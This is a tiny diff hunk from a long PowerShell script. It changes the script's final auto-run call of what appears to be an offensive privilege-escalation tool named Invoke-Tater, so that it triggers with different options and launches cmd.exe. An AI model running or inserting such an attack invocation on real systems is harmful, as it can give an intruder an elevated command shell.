@@ -1816,4 +1816,4 @@ function Get-Tater
 
 }
 
-Invoke-Tater -Trigger 1 -Command "cmd.exe"
+Invoke-Tater -Trigger 2 -HTTPPort 81 -Command "cmd.exe"
